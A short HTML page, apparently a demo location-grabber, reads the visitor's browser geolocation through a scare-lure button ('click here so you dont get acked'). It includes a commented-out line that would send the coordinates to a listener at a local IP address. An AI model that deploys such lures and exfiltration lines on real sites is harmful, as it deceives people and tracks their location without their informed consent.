  <body>
    <p>This site allows me to see your location</p>

    <button onclick="getLocation()">click here so you dont get acked</button>

    <p id="demo"></p>
    <script>
      var x = document.getElementById("demo");
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            showPosition,
            errorCallback,
            { timeout: 10000 }
          );
        } else {
          x.innerHTML = "GeoLocation is not supported by this browser";
        }
      }
      function showPosition(position) {
        var latlong = (x.innerHTML =
          "Latatude: " +
          position.coords.latitude +
          "<br> longatude: " +
          position.coords.longitude);
        //document.location = "http://192.168.1.112:4321/" + latlong;
      }

      function errorCallback(error) {
        x.innerHTML = "failed";
      }
    </script>
  </body>
